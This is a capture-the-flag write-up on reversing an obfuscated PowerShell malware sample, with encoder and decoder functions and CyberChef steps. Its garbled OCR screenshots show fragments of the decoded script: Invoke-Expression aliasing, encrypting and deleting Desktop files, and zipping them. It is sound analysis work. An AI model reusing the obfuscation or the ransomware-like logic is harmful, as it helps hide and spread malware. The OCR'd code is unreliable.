# IR #3
> Can you reverse the malware?

## About the Challenge
We need to reverse engineering the powershell script a.k.a the malware

## How to Solve?
If you open the script using notepad, the malware only contains special character


[Image extracted text: Nomc
updates p:1
Notepad
Quil
File
Edit
Format
View
Cess
B{;}-+Sc
S{-}-S{;
S{+
S{@_
{8}=
s{"}s{e}s{@z
}S{(}S{
S{e}s{&}-
}S{@}
S{e}s{@}-
}S{e}
{+}S{8}+S{
}S{@
}S{e}s
}S{e}+S{
}si&}s-
}+Si
}S{t}S{-}s{i}+S{"}s{i}s{)}+S{
}S{e}s
51&}$
}S{e}si
}S{+}S{=}
Help
}+S]


And then i tried to do some research about obfuscated powershell and I found this [article](https://perl-users.jp/articles/advent-calendar/2010/sym/11) talking about obfuscation on powershell. And as you can see in the article there is a function to obfuscate the powershell

```powershell
function Get-EncodedCode
{
    param([string]$code)
    ([char[]]$code|
    %{
        '${"}'+ ([int]$_  -replace "0",'${=}' -replace "1",'${+}' -replace "2",'${@}' -replace "3",'${.}' -replace "4",'${[}' -replace "5",'${]}' -replace "6",'${(}' -replace "7",'${)}' -replace "8",'${&}' -replace "9",'${|}')
    })  -join '+'
}
```

After that, I tried to create another function to decode the malware (With ChatGPT of course haha), and here is the function to decode the obfuscated powershell

```powershell
function Get-DecodedCode
{
    param([string]$encodedCode)

    # Define the mapping dictionary
    $decodeMap = @{
        '${"}' = '"';
        '${=}' = '0';
        '${+}' = '1';
        '${@}' = '2';
        '${.}' = '3';
        '${[}' = '4';
        '${]}' = '5';
        '${(}' = '6';
        '${)}' = '7';
        '${&}' = '8';
        '${|}' = '9'
    }

    # Replace the encoded characters with their decoded values
    $decodedCode = $encodedCode
    foreach ($key in $decodeMap.Keys) {
        $decodedCode = $decodedCode -replace [regex]::Escape($key), $decodeMap[$key]
    }

    return $decodedCode
}
```

And then I ran another command to read the content of `updates.ps1` and then deobfuscate the malware

```powershell
$encodedCode = Get-Content -Raw -Path "updates.ps1"
$decodedCode = Get-DecodedCode -encodedCode $encodedCode
Write-Host $decodedCode
```

And you will something like this in the terminal


[Image extracted text: C: Users  IEUser Downloads> SdecodedCode
Get
DecodedCode
encodedCode SencodedCode
(Users  IEUser
Dolnloads>
Nrite-Host
SdecodedCode
5{;}-+50);0-5{;};1=++5{;};2-++5{;};3-++5{;};4-++5{;}; 5-++5{;};6-++5{;};7-++5{;};8-++5{;};9-++5{;}
(@{})"[7]
(@{})"["19"1+"s(@{})"["
+"52"[1
(@{})"["14
(@{
"["16"]+
(@{})"[01+"s(@{}
[4]+"52"[1]+"s(@{-
[31)
S{;}"s(@{})"["14"
(@{})"[4]+"5{;
["27"]
36+"57+"72+"118+
116+"77+"70+"98+"67+"50+"82+"71+"74+
88+"54+"
65+"83+"106+"78+"101+"66+"120+"32+"61+"32+
34+
61+
107-
"105+"73+"119+"108+"109-
101+"117+"65+"51+"98+"48+"116+"50
108+
88+"122+"82+"87+"89+"118+"120+
109+"98+"51+"57+"71+"82+"99+"74+"121+"75+"121+"86+"50+"99+"49+"82+"121+
165+
"119+"49+
99+"121+"86+"50+"99+"86+"120+"108+
68+"74+"67+"75+"103+"103+"71+"100+"104+
66+"70+"98+"104+"74+"8
90+"48+
108
"71+"84+"116+"65+"83+"98+
108+"82+
88+"83+"116+"85+"109
"100+
118+"49+"87+"90+"83+"112+"81+
68+"53+"82+"5
105-
67+"73+"53+"
82+"50
"98
165+
50+
98+"112+
82+"72+
98+"112+"90+"71+
08+"57
"83+"98+"118+"78+
69+
36+
121+"86+"50+
106+"70+"71+
"115+"120+"87+"90+"111+"78+
110+"99+"108+"100+
"98+
Ja9+86+
"97+"48+"53+"121
100+"51+
100+"51+"76+"118+"111+"122+"99+"119+"82+"72+"100+
"74+"67+"73+"112+
88+
86+"116+
65+"67+"100+"122+"57+"71+"85+"103+"81+"50+"98+"111+"82+"88+"90+"78+"49+"67+"73+"48+"78+"88+"90+"49+"70+"
90+"121+"74+"87+"90+
88+"49+"83+"90+"114+"57+
169+
"117+
168+
"107+"67+"78+"48+"88+
"70+"71+"82+"108+"120-
"97+"71+"66+
88+"97+"54+"82+"83+"80+"108+"120+"87+"97+"109+"116+
72+"81+"103+"81+"51+"89+"108+
112+"109+"89+"80+"82+
100+"119+"53+
87+"83+"116+"65+"105+"98+
118+"78+"110+"83+"116+"56+"71+"86+"48+"74+
88+"90+"50+"53+"50+"98+'
68+"
66+"
8u+
JoaliosLiss+
Wiaelus]Lua
ISiLISdLRL"8iLSDLiSS
TeeluiLiol"celiL"RdL"0c4
Gol"es
T0+"i8
1+"5
"82+
789+
"48+
"Gn+]


Take the result and then open cyberchef and convert the result using decimal and you will something like this


[Image extracted text: Recipe
Input
+
D9
136+"57+"72+"118+"116+"77+"70+"98+"67+"50+"82+"71+"74+"88+"54+"89+"79+"65+"83+"106+"78+"101+"66+"1
Find
Replace
20+"32+"61+"32+"34+"61+"107+"105+"73+"119+"108+"109+"101+"117+"65+"51+"98+"48+"116+"50+"99+"108+
82+"69+"88+"122+"82+"87+"89+"118+"120+"109+"98+"51+"57+"71+"82+"99+"74+"121+"75+"121+"86+"50+"99+
Find
Replace
SIMPLE STRING
49+"82+"121+"75+"105+"119+"49+"99+"121+"86+"50+"99+"86+"120+"108+"79+"68+"74+"67+"75+"103+"103+
71+"100+
104+"66+"70+"98+
104+"74+
88+"90+
48+"108+"71+
84+"116+"65+"83+
98+"108+"82+"88+"83+"116
85+"109+"100+"118+"49+
87+"90+"83+"112+"81+
68+"53+"82+"50+"98+"105+"82+"67+"73+"53+"82+"50+"98
Global match
Case insensitive
67+"49+"67+"73+"105+"52+"50+"98+"112+"82+"88+"89+"121+"82+"72+"98+"112+"90+"71+"101+"108+"57+"8
3+"98+"118+"78+"109+"76+"121+"86+"50+"97+
106+"70+"71+"97+"115+"120+"87+"90+"111+"78+"110+"99+"10
8+"100+"51+"98+"119+"86+"71+"97+"48+"53+"121+"100+"51+"100+"51+"76+"118+
111+
"122+"99+"119+'
82+7
Multiline matching
Dot matches all
2+"100+"
11l+"74+"67+"73+"112+"74+'
88+"86+
116+"65+
67+"100+"122+"57+"71+"
85+"103+"81+"50+"98+"111
82+"88+"90+"78+"49+"67+"73+"48+"78+"88+"90+"49+"70+"88+"90+"121+"74+"87+"90+"88+"49+"83+"90+"11
4+"57+"109+"100+"117+"108+"107+"67+"78+"48+"88+"89+"48+"70+"71+"82+"108+"120+"87+"97+"71+"66+
88+
"97+
54+ 82+
83+"80+
108+"120+
87+
97+"109+
116+"72+
81+"103+
81+
51+"89+"108+"112+"109+"89+
80+
From Decimal
27640
Raw Bytes
Delimiter
Space
Support signed values
Output
M
zl3UbBSPgkXZrSiclhGcpNGJJkQCKOQKiMVRBJCKlRXY]J3Q6oTXthGdpJ3bnxWQjlmcovwbtl3UukHawFmcngGdwlncDsseo
ImcINWZTSSblR3cSNIWgODIyVGawlzykkocJoQDpUGdhVmcDpjodVGZvlUZslmRu8USuOwZONXeTtFIsUGbpzkbvlGdhSWaON
XZERCKtFWZyRBUlxlaGSyTJSSblR3cSNFIONWZqJ2TtcXZOBSPgIXZOlmcXlWY] JHdTVGbpZEJJkQCKOQKuVGcPpjodVGZvlU
ZslmRu8USuOWZONXeTtFIsUWbhSEbsVnRuUGbpZEJoOlYlJHdTVGbpzkLPlkLtVGdzl3UgQ3YlpmYPLydlSEI9AiclRWYLJVb
hVmcONVZslmRkkQcJoQDiMmblsiIgsCIl WYOxGblzkLlxWaGRCI9ASZslmRugWa FmbpR3clREJJkQCKOwepIyYuVmLiASZu
1CIugWazSWZOhXZuUGbpZEJoAizplQckOwepkSzslmRtASZzJXdjVmUtASey9GdjVmcpRUZZFmYkASblRXSkxWaoNULOVZROA
ibpBSZslmRkgCajFWZy9mzJ=
JoQDpkgCNkncVR3Y]-XaEV2chJGJgO1ZulmcONBWJkgCNOVKwOjbvlGdpNBbwBcL9VldyRBekot
eygGdhRmbhEKyVGdllWYyFGUblQCKOAKtFmchBVCKOwezVGbpZEdwlncjSWZgA2bpR3YuVnz
SOaET
S9HvtMFbC2RGJX6YOASjNeBx. TocharArray()
[array]
Reverse( SOaET)
join SOaET 2281> Snull
SbiPIvgahScgYwGxloFyv
[SysteM.tExt.EncOding
:uTf8.GetStRIng( [SySTEm. COnVert]::FrombASe64StRINg( "SOaET") )
SehyGknDcqxFWCYJzSvfot4t8
iN"+
vo"+"Ke
+"xP"+"RE"+"ss"+
Io"+"n"
neW-aLIAs
NAme
PWN
STEP
BAKEI
VAlUE SehyGknDcqxFWCYJzSvfot4t8
forcE
pWN SbiPIvgahScgYwGxlOFyV
Auto Bake
6388
16m5
Tr
Raw
Bytes]


Take the long string, and then reverse and decode it using `base64`. And voilà, the flag was located inside `$flag` variable


[Image extracted text: Recipe
Input
O
kQcJoQDpgicvRHc5J3YuVUZOFWZyNkLyVGawlzYkASPgOmcvZZcuFmcURSCJkgCNkCaodmblxkLWlkLyVGawlzYkACLWACLWI
Reverse
kLyVGawlzykgszolmcXSiclRXaydVbhVmcONVZs lmRkkQcJoQDpQDIsADIskcaodmblxkLWlkLyVGawlzykgyclRXeCRXZHpj
OdJXZOJXZZSZbDRXaCSSblR3cSNIWoUGdpJ3VuIxzolmcX1WY] JHdTVGbpZEJJkQCKOQKoYvslRXYyVmbldkLyVGawlzykkQc
JoQD3MIQLBLO6OVZkgWTnSWakRWYQSSeoBXYyd2boBxeyNkLSRXayV3YlNlLtvGdzl3UbBSPgcmbpRGZhBlLyVGawl2YkkQcj
Character
OQDpISIIMDbxYZXzg2NfxGba8lajBDbuV3XWczXSNzafNDa3ICKzVGdSJEdldkLAYEWVpjoddmbpRzbjSWRuQHelRlLtVGdzl
3UbBSPgkXZrSiclhGcpNGJJkQCKOQKiMVRBJCKlRXY]J3Q6oTxthGdpJ3bnxWQjlmcovwbtl:UukHawFmcngGdwlncDsSeolm
From Base64
cINWZTSSblR3cSNLWgODIyVGawlzykkQcJoQppUGdhVmcDpjodVGZvLUZslmRuBUSuOWZONXeTtFIsUGbpzkbvlGdhSWaONxZ
ERCKtFWZYRBUlxllaGSyTJSSblRBcSNFIONWZqJZTtcXZOBSPgIXZOlmcX1WY] JHdTVGbpZEJJkQCKOQKuVGcPpjodVGZvlUZs
Alphabet
ImRu8USuOWZONXeTtFIsUWbhSEbsVnRuUGbpZEJoOllJHdTVGbpZkLPlkLtVGdzl3ugQ3YlpmYPLydlSEI9AiclRWY]JVbhv
A-Za-20-9+/=
mcONVZslmRkkQcJoQDiMmblSiIgsCIl uYOxGbiZkLlxWaGRCI9ASZs lmRugWaOFmbpR3clREJJkQCKOwepIyYuVmLiASZulc
IugWazSWZOhXZuUGbpZEJoAiZplQcKOwepkszslmRtASZzJXdjVmUtASey9GdjVmcpRUZZFmYkASblRXSkxWaoNULOVZRoAib
pBSZslmRkgCajFWZy9mZJoQppkgCNkncvR3Y]JXaEVZchJGJgOlZulmcONBWJkgCNOVKwojbvlGdpN3bwBCL9VldyR3ekotey
Remove non-alphabet chars
Strict mode
9GdhRmbhlEKyVGdl1WYyFGUblQcKOAKtFmchBVCKOwezVGbpZEdwlncjSWZgA2bpR3YuVnz
2787
Raw Bytes
Output
0 0
M
{
Remove-Item -LiteralPath SFile. FullNamecR
} cR
} cR
"flag{892a8921517dcecf90685d478aedf5e2}
SErrorActionPreference=
silentlycontinue
Suser
[System.Security.Principal.WindowsIdentity]
:GetCurrent()
Name
Split("1")[-1]
encryptFiles("€: |Users
+Suser+"|Desktop"
Add-Type -assembly
'system_
io.compression.filesystem" cR
[io.compression.zipfile]::CreateFromDirectory("€: |users|
+Suser+" IDesktop'
"C:lusers| "+Suser+" |Downloads |Desktop.zip'
SzipFileBytes
Get-Content
~Path ("C: lusers| "+Suser+
Downloads |Desktop.zip"
Raw
Encoding
STEP
BAKEI
Bytecr
Auto Bake
2090
4m5
Raw Bytes
Sflag]


```
flag{892a8921517dcecf90685d478aedf5e2}
```